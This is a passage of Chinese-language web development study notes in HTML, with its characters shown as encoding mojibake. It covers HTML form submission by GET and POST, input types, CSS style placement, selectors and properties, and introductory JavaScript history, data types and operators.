ä¸­æ˜¾ç¤ºï¼Œå°è£…åœ¨è¯·æ±‚è¡Œä¸­ï¼Œè¯·æ±‚å‚æ•°é•¿åº¦æœ‰é™åˆ¶,ä¸å¤ªå®‰å…¨</li><li>postï¼šè¯·æ±‚å‚æ•°ä¸åœ¨åœ°å€æ ä¸­æ˜¾ç¤ºï¼Œä¼šå°è£…åœ¨è¯·æ±‚ä½“ä¸­ï¼Œè¯·æ±‚å‚æ•°é•¿åº¦æ²¡é™åˆ¶ï¼Œæ¯”è¾ƒå®‰å…¨</li></ul></li></ul><blockquote><p>getæ–¹å¼æäº¤å®Œï¼Œurlä¸Šä¼šæ˜¾ç¤ºä¼ å‚ï¼Œå‚æ•°åæ˜¯è¾“å…¥æ¡†çš„nameå±æ€§</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;#&quot;</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span></span><br><span class="line">ç”¨æˆ·åï¼š<span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">å¯†ç :<span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> &gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ç™»å½•&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>url?username&#x3D;13213&amp;password&#x3D;ewe#</p><p>æ³¨æ„ï¼šä¸åŠ nameå±æ€§ï¼Œä¸ä¼šè¢«æäº¤,å› æ­¤å¿…é¡»æŒ‡å®šnameå±æ€§</p></blockquote><h3 id="è¡¨å•é¡¹æ ‡ç­¾"><a href="#è¡¨å•é¡¹æ ‡ç­¾" class="headerlink" title="è¡¨å•é¡¹æ ‡ç­¾"></a>è¡¨å•é¡¹æ ‡ç­¾</h3><h4 id="input"><a href="#input" class="headerlink" title="input"></a>input</h4><p>é€šè¿‡typeå±æ€§å€¼ï¼Œæ”¹å˜å±•ç¤ºæ ·å¼,é»˜è®¤typeä¸ºtextè¡¨ç¤ºæ–‡æœ¬è¾“å…¥æ¡†</p><p>typeå±æ€§å–å€¼</p><ul><li><p>textï¼šæ–‡æœ¬è¾“å…¥æ¡†</p><ul><li>placeholderå±æ€§ï¼Œè®¾ç½®æç¤ºå†…å®¹ï¼Œæ·¡æ·¡ç°è‰²</li></ul></li><li><p>password ï¼šå¯†ç è¾“å…¥æ¡†</p></li><li><p>radio å•é€‰æ¡†,è¦å®ç°å•é€‰æ•ˆæœï¼Œnameå±æ€§è¦ä¸€æ · ï¼Œé€‰æ‹©çš„è¯ä¼ å‚æ•°<code>nameå€¼=å‚æ•°å€¼</code></p><ul><li><p>ä¸€èˆ¬åŠ ä¸Švalueå±æ€§ è¡¨ç¤ºè¯¥é€‰é¡¹è¢«é€‰ä¸­åä¼ çš„å‚æ•°å€¼</p><blockquote><p>å¦‚æœä¸åŠ valueï¼Œåªä¼šä¼ onå’Œoffï¼Œonè¡¨ç¤ºæœ‰è¢«é€‰ä¸­ï¼Œoffè¡¨ç¤ºéƒ½æ²¡è¢«é€‰</p></blockquote></li><li><p>checkedå±æ€§ï¼Œè®¾ç½®èµ‹å€¼checkedæˆ–åªåŠ checkéƒ½å¯ä»¥é»˜è®¤é€‰</p></li></ul></li><li><p>checkbox å¤é€‰æ¡†</p><ul><li>åŸºæœ¬å’Œå•é€‰æ¡†ä¸€æ ·</li></ul></li><li><p>file æ–‡ä»¶é€‰æ‹©æ¡†</p></li><li><p>hidden éšè—åŸŸï¼Œç”¨äºæäº¤ä¸€äº›ä¿¡æ¯</p></li><li><p>submit æäº¤è¡¨å•</p></li><li><p>button æŒ‰é’®</p><ul><li>å¯ä»¥åŠ å›¾ç‰‡ srcå±æ€§</li></ul></li><li><p>image å›¾ç‰‡æ ·å¼çš„æäº¤æŒ‰é’®</p></li><li><p>color å–è‰²å™¨</p></li><li><p>datetime-local&#x2F;data æ—¥æœŸ</p></li><li><p>email é‚®ç®±è¾“å…¥æ¡†ï¼Œä¼šè¿›è¡Œæ ¼å¼æ ¡éªŒ</p></li><li><p>number åªèƒ½è¾“å…¥æ•°å­—</p></li></ul><p>labelæ ‡ç­¾ æŒ‡å®šè¾“å…¥é¡¹çš„æ–‡å­—æè¿°ä¿¡æ¯</p><blockquote><p>labelçš„forå±æ€§ä¸€èˆ¬å’Œinputçš„nameå±æ€§å¯¹åº”ï¼Œå¯¹åº”åï¼Œç‚¹å‡»labelåŒºåŸŸï¼Œä¼šè®©inputè¾“å…¥æ¡†è·å–ç„¦ç‚¹</p></blockquote><h4 id="select"><a href="#select" class="headerlink" title="select"></a>select</h4><p>ä¸‹æ‹‰åˆ—è¡¨</p><ul><li>å­å…ƒç´ ï¼š optionæŒ‡å®šåˆ—è¡¨é¡¹</li></ul><h4 id="textarea"><a href="#textarea" class="headerlink" title="textarea"></a>textarea</h4><p>æ–‡æœ¬åŸŸ</p><ul><li>cols æŒ‡å®šåˆ—æ•°ï¼Œæ¯è¡Œæœ‰å‡ ä¸ªå­—ç¬¦</li><li>rows æŒ‡å®šè¡Œæ•°ï¼Œæœ€å¤šå‡ è¡Œ</li></ul><h1 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h1><h2 id="æ¦‚å¿µ-2"><a href="#æ¦‚å¿µ-2" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h2><p>å†…å®¹ä¸æ ·å¼åˆ†ç¦»</p><h2 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h2><h3 id="ä¸‰ç§æ ·å¼"><a href="#ä¸‰ç§æ ·å¼" class="headerlink" title="ä¸‰ç§æ ·å¼"></a>ä¸‰ç§æ ·å¼</h3><ol><li>å†…è”æ ·å¼</li></ol><ul><li>åœ¨æ ‡ç­¾å†…ä½¿ç”¨styleå±æ€§æŒ‡å®šcssä»£ç <ul><li>å¦‚ï¼š<code>&lt;div style=&quot;color:red;&quot;&gt;hello css&lt;/div&gt;</code></li></ul></li></ul><ol start="2"><li><p>å†…éƒ¨æ ·å¼</p><ul><li><p>åœ¨headæ ‡ç­¾å†…ï¼Œå®šä¹‰styleæ ‡ç­¾ï¼Œstyleæ ‡ç­¾çš„æ ‡ç­¾ä½“å†…å®¹å°±æ˜¯cssä»£ç </p></li><li><p>å¦‚ï¼š</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-tag">div</span>&#123;</span></span><br><span class="line"><span class="language-css">          <span class="attribute">color</span>:blue;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>hello css<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></div></li></ul></li><li><p>å¤–éƒ¨æ ·å¼</p><ol><li>å®šä¹‰cssèµ„æºæ–‡ä»¶ã€‚</li><li>åœ¨headæ ‡ç­¾å†…ï¼Œå®šä¹‰linkæ ‡ç­¾ï¼Œå¼•å…¥å¤–éƒ¨çš„èµ„æºæ–‡ä»¶</li></ol><ul><li><p>å¦‚ï¼ša.cssæ–‡ä»¶ï¼š</p><div class="highlight-container" data-rel="Css"><figure class="iseeu highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>:green;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--htmlæ–‡ä»¶--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;css/a.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>hello css<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>hello css<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></div></li></ul></li></ol><blockquote><p>æ³¨æ„ï¼š</p><ul><li><p>1,2,3ç§æ–¹å¼ cssä½œç”¨èŒƒå›´è¶Šæ¥è¶Šå¤§</p></li><li><p>1æ–¹å¼ä¸å¸¸ç”¨ï¼ŒåæœŸå¸¸ç”¨2,3</p></li><li><p>3ç§æ ¼å¼å¯ä»¥å†™ä¸ºï¼š</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="keyword">@import</span> <span class="string">&quot;css/a.css&quot;</span>;</span></span><br><span class="line"><span class="language-css">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure></div></li></ul></blockquote><h2 id="è¯­æ³•-1"><a href="#è¯­æ³•-1" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h2><h3 id="æ ¼å¼-1"><a href="#æ ¼å¼-1" class="headerlink" title="æ ¼å¼"></a>æ ¼å¼</h3><p>éƒ½è¦åœ¨styleæ ‡ç­¾å†…</p><div class="highlight-container" data-rel="Css"><figure class="iseeu highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">é€‰æ‹©å™¨ &#123;</span><br><span class="line">  å±æ€§å<span class="number">1</span>:å€¼<span class="number">1</span>;</span><br><span class="line">  å±æ€§å<span class="number">2</span>:å€¼<span class="number">2</span>;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>æ³¨æ„ï¼šå„å±æ€§é—´ç”¨<code>;</code>éš”å¼€ æœ€åä¸€ä¸ªå…ƒç´ å¯åŠ å¯ä¸åŠ </p></blockquote><h3 id="é€‰æ‹©å™¨"><a href="#é€‰æ‹©å™¨" class="headerlink" title="é€‰æ‹©å™¨"></a>é€‰æ‹©å™¨</h3><p>é€‰æ‹©å™¨ï¼šç­›é€‰å…·æœ‰ç›¸åŒç‰¹å¾çš„å…ƒç´ </p><h4 id="åŸºæœ¬é€‰æ‹©å™¨"><a href="#åŸºæœ¬é€‰æ‹©å™¨" class="headerlink" title="åŸºæœ¬é€‰æ‹©å™¨"></a>åŸºæœ¬é€‰æ‹©å™¨</h4><ul><li><p>idé€‰æ‹©å™¨ï¼šé€‰æ‹©å…·ä½“idå±æ€§å€¼çš„å…ƒç´ </p><ul><li><p>è¯­æ³•ï¼š#idå±æ€§å€¼{} </p><blockquote><p>å»ºè®®idå€¼åœ¨ä¸€ä¸ªhtmlæ–‡ä»¶ä¸­å”¯ä¸€</p></blockquote></li></ul></li><li><p>å…ƒç´ é€‰æ‹©å™¨:é€‰æ‹©å…·æœ‰ç›¸åŒæ ‡ç­¾åç§°çš„å…ƒç´ </p><ul><li><p>æ ‡ç­¾åç§°{}</p><blockquote><p>idé€‰æ‹©å™¨ä¼˜å…ˆçº§é«˜äºå…ƒç´ é€‰æ‹©å™¨</p></blockquote></li></ul></li><li><p>ç±»é€‰æ‹©å™¨ï¼šé€‰æ‹©å…·æœ‰ç›¸åŒclasså±æ€§å€¼çš„å…ƒç´ </p><ul><li><p>.classå±æ€§å€¼{}</p><blockquote><p>ç±»é€‰æ‹©å™¨ä¼˜å…ˆçº§é«˜äºå…ƒç´ é€‰æ‹©å™¨</p><p>ä¼˜å…ˆçº§ idé€‰æ‹©å™¨&gt;ç±»é€‰æ‹©å™¨&gt;å…ƒç´ é€‰æ‹©å™¨</p></blockquote></li></ul></li></ul><blockquote><p>æ³¨æ„ï¼šå±æ€§å€¼ä¸èƒ½ä»¥æ•°å­—å¼€å¤´ï¼Œä¹Ÿä¸èƒ½çº¯æ•°å­—</p></blockquote><h4 id="æ‰©å±•é€‰æ‹©å™¨"><a href="#æ‰©å±•é€‰æ‹©å™¨" class="headerlink" title="æ‰©å±•é€‰æ‹©å™¨"></a>æ‰©å±•é€‰æ‹©å™¨</h4><ul><li><p>é€‰æ‹©æ‰€æœ‰å…ƒç´ </p><ul><li>*{}</li></ul></li><li><p>å¹¶é›†é€‰æ‹©å™¨</p><ul><li>é€‰æ‹©å™¨1,é€‰æ‹©å™¨2{}</li></ul></li><li><p>åä»£é€‰æ‹©å™¨ï¼šç­›é€‰é€‰æ‹©å™¨1å…ƒç´ ä¸‹æ‰€æœ‰çš„é€‰æ‹©å™¨2ï¼ˆåŒ…æ‹¬å…¶å­™ç±»ä¸­çš„ï¼‰</p><ul><li>é€‰æ‹©å™¨1 é€‰æ‹©å™¨2{}</li></ul></li><li><p>å­é€‰æ‹©å™¨:ç­›é€‰çˆ¶å…ƒç´ æ˜¯é€‰æ‹©å™¨1çš„é€‰æ‹©å™¨2ï¼ˆåªçœ‹ç›´æ¥å­ç±»ï¼‰</p><ul><li>é€‰æ‹©å™¨1&gt;é€‰æ‹©å™¨2{}</li></ul><blockquote><p>æ³¨æ„ï¼Œå¦‚æœé€‰æ‹©å™¨2å…ƒç´ å†…æœ‰å­æ ‡ç­¾ï¼Œåˆ™ä¼šè¿åŒå­æ ‡ç­¾ä¸€èµ·ä½¿ç”¨æ ·å¼ï¼Œåä»£é€‰æ‹©å™¨å’Œå­é€‰æ‹©å™¨éƒ½æœ‰è¿™ç§æ•ˆæœ</p><ul><li>å¯åœ¨é€‰æ‹©å™¨ååŠ <code>:first-child</code> æˆ–<code>:last-child</code>è¡¨ç¤ºé€‰æ‹©ç¬¬ä¸€ä¸ªå­ç±»æˆ–æœ€åä¸€ä¸ª </li><li>âš ï¸è¿™ç§åŠ å†’å·ï¼Œå†’å·å’Œå·¦å³ä¸¤ä¸ªå­—ç¬¦ä¸²éƒ½ä¸èƒ½æœ‰ç©ºæ ¼é—´éš™</li></ul></blockquote></li><li><p>å±æ€§é€‰æ‹©å™¨:é€‰æ‹©å…ƒç´ åç§°ï¼Œå±æ€§å&#x3D;å±æ€§å€¼çš„å…ƒç´ </p><ul><li>å…ƒç´ åç§°[å±æ€§å&#x3D;â€å±æ€§å€¼â€]</li></ul></li><li><p>ä¼ªç±»é€‰æ‹©å™¨ï¼šé€‰æ‹©ä¸€äº›å…ƒç´ å…·æœ‰çš„çŠ¶æ€</p><ul><li>è¯­æ³•ï¼š å…ƒç´ :çŠ¶æ€{}</li><li><a>:çŠ¶æ€<ul><li>çŠ¶æ€<ul><li>link åˆå§‹åŒ–çŠ¶æ€</li><li>vistied è¢«è®¿é—®è¿‡çš„çŠ¶æ€</li><li>active æ­£åœ¨è®¿é—®çŠ¶æ€(é¼ æ ‡ç‚¹ä½ä¸æ”¾)</li><li>hover é¼ æ ‡æ‚¬æµ®çŠ¶æ€</li></ul></li></ul></li></ul></li></ul><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/e6c9d24ely1h4evjjzsv9j20sm0aywfm.jpg"                      alt="image-20220721213511321"                ><figcaption>image-20220721213511321</figcaption></figure></p><h3 id="å±æ€§-2"><a href="#å±æ€§-2" class="headerlink" title="å±æ€§"></a>å±æ€§</h3><p>ä¸€èˆ¬ç”¨åœ¨divå…ƒç´ æ ‡ç­¾ä¸‹</p><ol><li><p>å­—ä½“ã€æ–‡æœ¬</p><ul><li>font-size å­—ä½“å¤§å°</li><li>color æ–‡æœ¬é¢œè‰²</li><li>text-align å¯¹é½æ–¹å¼</li><li>line-heightï¼šè¡Œé«˜</li></ul></li><li><p>èƒŒæ™¯</p><ul><li>background</li></ul></li><li><p>è¾¹æ¡†</p><ul><li>border è®¾ç½®è¾¹æ¡†ï¼Œç¬¦åˆå±æ€§</li></ul></li><li><p>å°ºå¯¸</p><ul><li>width å®½åº¦</li><li>height é«˜åº¦</li></ul><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-tag">div</span>&#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">border</span>: <span class="number">1px</span> solid red;</span></span><br><span class="line"><span class="language-css">    <span class="comment">/*å°ºå¯¸*/</span></span></span><br><span class="line"><span class="language-css">    <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">width</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="comment">/*èƒŒæ™¯*/</span></span></span><br><span class="line"><span class="language-css">    <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">&quot;../image/2.jpg&quot;</span>) no-repeat center;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure></div></li><li><p>ç›’å­æ¨¡å‹:æ§åˆ¶å¸ƒå±€</p><ul><li><p>margin å¤–è¾¹è·</p></li><li><p>padding å†…è¾¹è·</p><ul><li><p>é»˜è®¤æƒ…å†µä¸‹å†…è¾¹è·ä¼šå½±å“ç›’å­å¤§å°</p><blockquote><p><code>box-sizing: border-box;</code> è®¾ç½®ç›’å­å±æ€§,è®©width heightä¸å˜</p></blockquote></li></ul></li><li><p>float æµ®åŠ¨</p><ul><li>left åœ¨è¯¥è¡Œ</li><li>right</li></ul></li></ul></li></ol><h1 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h1><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><h3 id="æ¦‚å¿µï¼šä¸€é—¨å®¢æˆ·ç«¯è„šæœ¬è¯­è¨€"><a href="#æ¦‚å¿µï¼šä¸€é—¨å®¢æˆ·ç«¯è„šæœ¬è¯­è¨€" class="headerlink" title="æ¦‚å¿µï¼šä¸€é—¨å®¢æˆ·ç«¯è„šæœ¬è¯­è¨€"></a>æ¦‚å¿µï¼šä¸€é—¨å®¢æˆ·ç«¯è„šæœ¬è¯­è¨€</h3><ul><li>è¿è¡Œåœ¨å®¢æˆ·ç«¯æµè§ˆå™¨ä¸­çš„ã€‚æ¯ä¸€ä¸ªæµè§ˆå™¨éƒ½æœ‰JavaScriptçš„è§£æå¼•æ“</li><li>è„šæœ¬è¯­è¨€ï¼šä¸éœ€è¦ç¼–è¯‘ï¼Œç›´æ¥å°±å¯ä»¥è¢«æµè§ˆå™¨è§£ææ‰§è¡Œäº†</li></ul><h3 id="åŠŸèƒ½ï¼š"><a href="#åŠŸèƒ½ï¼š" class="headerlink" title="åŠŸèƒ½ï¼š"></a>åŠŸèƒ½ï¼š</h3><ul><li>å¯ä»¥æ¥å¢å¼ºç”¨æˆ·å’Œhtmlé¡µé¢çš„äº¤äº’è¿‡ç¨‹ï¼Œå¯ä»¥æ¥æ§åˆ¶htmlå…ƒç´ ï¼Œè®©é¡µé¢æœ‰ä¸€äº›åŠ¨æ€çš„æ•ˆæœï¼Œå¢å¼ºç”¨æˆ·çš„ä½“éªŒã€‚</li></ul><h3 id="JavaScriptå‘å±•å²ï¼š"><a href="#JavaScriptå‘å±•å²ï¼š" class="headerlink" title="JavaScriptå‘å±•å²ï¼š"></a>JavaScriptå‘å±•å²ï¼š</h3><ol><li>1992å¹´ï¼ŒNombaseå…¬å¸ï¼Œå¼€å‘å‡ºç¬¬ä¸€é—¨å®¢æˆ·ç«¯è„šæœ¬è¯­è¨€ï¼Œä¸“é—¨ç”¨äºè¡¨å•çš„æ ¡éªŒã€‚å‘½åä¸º ï¼š Câ€“ï¼Œåæ¥æ›´åä¸ºï¼šScriptEase</li><li>1995å¹´ï¼ŒNetscape(ç½‘æ™¯)å…¬å¸ï¼Œå¼€å‘äº†ä¸€é—¨å®¢æˆ·ç«¯è„šæœ¬è¯­è¨€ï¼šLiveScriptã€‚åæ¥ï¼Œè¯·æ¥SUNå…¬å¸çš„ä¸“å®¶ï¼Œä¿®æ”¹LiveScriptï¼Œå‘½åä¸ºJavaScript</li><li>1996å¹´ï¼Œå¾®è½¯æŠ„è¢­JavaScriptå¼€å‘å‡ºJScriptè¯­è¨€</li><li>1997å¹´ï¼ŒECMA(æ¬§æ´²è®¡ç®—æœºåˆ¶é€ å•†åä¼š)ï¼Œåˆ¶å®šå‡ºå®¢æˆ·ç«¯è„šæœ¬è¯­è¨€çš„æ ‡å‡†ï¼šECMAScriptï¼Œå°±æ˜¯ç»Ÿä¸€äº†æ‰€æœ‰å®¢æˆ·ç«¯è„šæœ¬è¯­è¨€çš„ç¼–ç æ–¹å¼ã€‚</li></ol><blockquote><p>JavaScript &#x3D; ECMAScript + JavaScriptè‡ªå·±ç‰¹æœ‰çš„ä¸œè¥¿(BOM+DOM)</p></blockquote><h2 id="è¯­æ³•-2"><a href="#è¯­æ³•-2" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h2><h3 id="åŸºæœ¬è¯­æ³•"><a href="#åŸºæœ¬è¯­æ³•" class="headerlink" title="åŸºæœ¬è¯­æ³•"></a>åŸºæœ¬è¯­æ³•</h3><ol><li><h4 id="ä¸htmlç»“åˆæ–¹å¼"><a href="#ä¸htmlç»“åˆæ–¹å¼" class="headerlink" title="ä¸htmlç»“åˆæ–¹å¼"></a>ä¸htmlç»“åˆæ–¹å¼</h4><ul><li>å†…éƒ¨JSï¼š<ul><li>å®šä¹‰<script>ï¼Œæ ‡ç­¾ä½“å†…å®¹å°±æ˜¯jsä»£ç </li></ul></li><li>å¤–éƒ¨JS<ul><li>å®šä¹‰<script>ï¼Œé€šè¿‡srcå±æ€§å¼•å…¥å¤–éƒ¨çš„jsæ–‡ä»¶</li></ul></li></ul></li></ol><blockquote><pre><code>    - `&lt;script&gt;`å¯ä»¥å®šä¹‰åœ¨htmlé¡µé¢çš„ä»»ä½•åœ°æ–¹ã€‚ä½†æ˜¯å®šä¹‰çš„ä½ç½®ä¼šå½±å“æ‰§è¡Œé¡ºåºã€‚        - `&lt;script&gt;`å¯ä»¥å®šä¹‰å¤šä¸ªã€‚</code></pre></blockquote><ol start="2"><li><h4 id="æ³¨é‡Š-1"><a href="#æ³¨é‡Š-1" class="headerlink" title="æ³¨é‡Š"></a>æ³¨é‡Š</h4><ul><li><p>å•è¡Œæ³¨é‡Šï¼š<code>//æ³¨é‡Šå†…å®¹</code></p></li><li><p>å¤šè¡Œæ³¨é‡Šï¼š<code>/*æ³¨é‡Šå†…å®¹*/</code></p></li></ul></li><li><h4 id="æ•°æ®ç±»å‹ï¼š"><a href="#æ•°æ®ç±»å‹ï¼š" class="headerlink" title="æ•°æ®ç±»å‹ï¼š"></a>æ•°æ®ç±»å‹ï¼š</h4><ol><li><p>åŸå§‹æ•°æ®ç±»å‹(åŸºæœ¬æ•°æ®ç±»å‹)ï¼š</p><ul><li><p>numberï¼šæ•°å­—ã€‚ æ•´æ•°/å°æ•°/NaN(not a number ä¸€ä¸ªä¸æ˜¯æ•°å­—çš„æ•°å­—ç±»å‹)</p></li><li><p>stringï¼šå­—ç¬¦ä¸²ã€‚ å­—ç¬¦ä¸²  "abc" "a" 'abc'</p><blockquote><p>æ²¡æœ‰å­—ç¬¦çš„æ¦‚å¿µ</p></blockquote></li><li><p>boolean: trueå’Œfalse</p></li><li><p>nullï¼šä¸€ä¸ªå¯¹è±¡ä¸ºç©ºçš„å ä½ç¬¦</p></li><li><p>undefinedï¼šæœªå®šä¹‰ã€‚å¦‚æœä¸€ä¸ªå˜é‡æ²¡æœ‰ç»™åˆå§‹åŒ–å€¼ï¼Œåˆ™ä¼šè¢«é»˜è®¤èµ‹å€¼ä¸ºundefined</p></li></ul></li><li><p>å¼•ç”¨æ•°æ®ç±»å‹ï¼šå¯¹è±¡</p></li></ol></li><li><h4 id="å˜é‡"><a href="#å˜é‡" class="headerlink" title="å˜é‡"></a>å˜é‡</h4><ul><li>å˜é‡ï¼šä¸€å°å—å­˜å‚¨æ•°æ®çš„å†…å­˜ç©ºé—´</li><li>Javaè¯­è¨€æ˜¯å¼ºç±»å‹è¯­è¨€ï¼Œè€ŒJavaScriptæ˜¯å¼±ç±»å‹è¯­è¨€ã€‚<ul><li>å¼ºç±»å‹ï¼šåœ¨å¼€è¾Ÿå˜é‡å­˜å‚¨ç©ºé—´æ—¶ï¼Œå®šä¹‰äº†ç©ºé—´å°†æ¥å­˜å‚¨çš„æ•°æ®çš„æ•°æ®ç±»å‹ã€‚åªèƒ½å­˜å‚¨å›ºå®šç±»å‹çš„æ•°æ®</li><li>å¼±ç±»å‹ï¼šåœ¨å¼€è¾Ÿå˜é‡å­˜å‚¨ç©ºé—´æ—¶ï¼Œ<u>ä¸å®šä¹‰ç©ºé—´å°†æ¥çš„å­˜å‚¨æ•°æ®ç±»å‹</u>ï¼Œå¯ä»¥å­˜æ”¾ä»»æ„ç±»å‹çš„æ•°æ®ã€‚</li></ul></li><li>è¯­æ³• <code>var å˜é‡å = åˆå§‹åŒ–å€¼;</code></li><li>typeofè¿ç®—ç¬¦ï¼šè·å–å˜é‡çš„ç±»å‹ã€‚<code>typeof(å˜é‡å)</code><br>* æ³¨ï¼šnullè¿ç®—åå¾—åˆ°çš„æ˜¯object</li></ul></li><li><h4 id="è¿ç®—ç¬¦"><a href="#è¿ç®—ç¬¦" class="headerlink" title="è¿ç®—ç¬¦"></a>è¿ç®—ç¬¦</h4><ul><li><p>ä¸€å…ƒè¿ç®—ç¬¦</p><ol><li>++ï¼Œ-- ï¼Œ +(æ­£å·)</li></ol><ul><li>++ -- è‡ªå¢ è‡ªå‡ ï¼ˆä¹Ÿæœ‰åœ¨å‰åœ¨åä¹‹åˆ†ï¼‰</li></ul><ol start="2"><li><p>+(-)ï¼šæ­£è´Ÿå·</p><ul><li><p>åœ¨JSä¸­ï¼Œå¦‚æœè¿ç®—æ•°ä¸æ˜¯è¿ç®—ç¬¦æ‰€è¦æ±‚çš„ç±»å‹ï¼Œé‚£ä¹ˆjså¼•æ“ä¼šè‡ªåŠ¨çš„å°†è¿ç®—æ•°è¿›è¡Œç±»å‹è½¬æ¢</p><blockquote><p>å…¶ä»–ç±»å‹è½¬numberï¼š</p><ul><li>stringè½¬numberï¼šæŒ‰ç…§å­—é¢å€¼è½¬æ¢(çº¯æ•°å­—å­—ç¬¦ä¸²æ‰èƒ½è½¬æ•°å­—)ã€‚å¦‚æœå­—é¢å€¼ä¸æ˜¯æ•°å­—ï¼Œåˆ™è½¬ä¸ºNaNï¼ˆä¸æ˜¯æ•°å­—çš„æ•°å­—,ä¸åˆ«çš„æ•°å­—è¿ç®—ï¼Œç»“æœä»ä¸ºNaNï¼‰</li><li>booleanè½¬numberï¼štrueè½¬ä¸º1ï¼Œfalseè½¬ä¸º0</li><li>åœ¨å…¶ä»–ç±»å‹æ•°æ®å‰åŠ ä¸Š+æˆ–-ä¼šå°†åé¢çš„æ•°æ®å¼ºåˆ¶è½¬æ¢æˆnumber</li></ul></blockquote></li></ul></li></ol></li><li><p>ç®—æ•°è¿ç®—ç¬¦</p><ul><li><code>+ - * / % ...</code></li></ul></li><li><p>èµ‹å€¼è¿ç®—ç¬¦</p><ul><li>= += -+....</li></ul></li><li><p>æ¯”è¾ƒè¿ç®—ç¬¦</p><ul><li><p>< >= <= == ===(å…¨ç­‰äº)</p><blockquote><p><strong>æ¯”è¾ƒæ–¹å¼</strong></p><ol><li>ç±»å‹ç›¸åŒï¼šç›´æ¥æ¯”è¾ƒ<ul><li>å­—ç¬¦ä¸²ï¼šæŒ‰ç…§å­—å…¸é¡ºåºæ¯”è¾ƒã€‚æŒ‰ä½é€ä¸€æ¯”è¾ƒï¼Œç›´åˆ°å¾—å‡ºå¤§å°ä¸ºæ­¢</li></ul></li><li>ç±»å‹ä¸åŒï¼šå…ˆè¿›è¡Œç±»å‹è½¬æ¢ï¼Œå†æ¯”è¾ƒ<br>* 